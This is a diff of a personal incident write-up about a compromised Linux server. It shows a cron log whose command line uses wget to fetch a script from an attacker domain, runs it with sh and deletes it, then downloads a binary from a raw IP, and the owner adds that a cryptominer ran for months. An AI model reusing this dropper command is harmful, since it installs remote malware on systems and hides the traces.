@@ -98,15 +98,7 @@ happening on June 21st 2017.
      
 ```
 Subject: Cron <root@timbuktu> wget -q http://update.sdgndsfajfsdf.info/upd -O /tmp/updatescript;sh /tmp/updatescript;rm -rf /tmp/updatescript > /dev/null 2>&1 
-MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-X-Cron-Env: <SHELL=/bin/sh>
-X-Cron-Env: <HOME=/root>
-X-Cron-Env: <PATH=/usr/bin:/bin>
-X-Cron-Env: <LOGNAME=root>
-Message-Id: <20170620220009.1141AC0B1B@timbuktu.lyse.net>
-Date: Wed, 21 Jun 2017 00:00:09 +0200 (CEST)
+...(snip)
 
 b: no process found
 --2017-06-21 00:00:02--  http://95.211.58.208/bb
@@ -118,43 +110,18 @@ HTTP request sent, awaiting response... 200 OK
 Length: 924952 (903K) [text/plain]
 Saving to: ‘/tmp/bb’
 
-     0K .......... .......... .......... .......... ..........  5%  765K 1s
-    50K .......... .......... .......... .......... .......... 11% 2.11M 1s
-   100K .......... .......... .......... .......... .......... 16% 2.28M 1s
-   150K .......... .......... .......... .......... .......... 22% 11.3M 0s
-   200K .......... .......... .......... .......... .......... 27% 2.62M 0s
-   250K .......... .......... .......... .......... .......... 33% 11.0M 0s
-   300K .......... .......... .......... .......... .......... 38% 3.04M 0s
-   350K .......... .......... .......... .......... .......... 44% 11.0M 0s
-   400K .......... .......... .......... .......... .......... 49% 11.3M 0s
-   450K .......... .......... .......... .......... .......... 55% 11.4M 0s
-   500K .......... .......... .......... .......... .......... 60% 6.40M 0s
-   550K .......... .......... .......... .......... .......... 66% 11.3M 0s
-   600K .......... .......... .......... .......... .......... 71% 11.3M 0s
-   650K .......... .......... .......... .......... .......... 77% 11.0M 0s
-   700K .......... .......... .......... .......... .......... 83% 11.3M 0s
-   750K .......... .......... .......... .......... .......... 88% 11.3M 0s
-   800K .......... .......... .......... .......... .......... 94% 11.0M 0s
-   850K .......... .......... .......... .......... .......... 99%  454K 0s
-   900K ...                                                   100% 6244G=0.3s
+...(snip)
 
 2017-06-21 00:00:05 (2.84 MB/s) - ‘/tmp/bb’ saved [924952/924952]
 
 /tmp/updatescript: 14: /tmp/updatescript: route: not found
 /tmp/updatescript: 15: /tmp/updatescript: route: not found
-/tmp/updatescript: 16: /tmp/updatescript: route: not found
-/tmp/updatescript: 17: /tmp/updatescript: route: not found
-/tmp/updatescript: 18: /tmp/updatescript: route: not found
-/tmp/updatescript: 19: /tmp/updatescript: route: not found
-/tmp/updatescript: 20: /tmp/updatescript: route: not found
-/tmp/updatescript: 21: /tmp/updatescript: route: not found
-/tmp/updatescript: 22: /tmp/updatescript: route: not found
-/tmp/updatescript: 23: /tmp/updatescript: route: not found
-/tmp/updatescript: 24: /tmp/updatescript: route: not found
-/tmp/updatescript: 25: /tmp/updatescript: route: not found
-/tmp/updatescript: 26: /tmp/updatescript: route: not found
-/tmp/updatescript: 27: /tmp/updatescript: route: not found
+...(snip)
 ```
+
+This was the start of at least 7 months of pwning of my machine, with continuous updates, including a cpuminer script. I am now wondering if this might be the reason [I am seing `kjournald` having 700 open connections to an ip in Italy](https://serverfault.com/questions/896283/why-is-kjournald-showing-up-700-times-in-netstat) ... :-/
+
+A portion of the relevant mail dumps can be found by expanding this section.
 </summary>
 
 ```
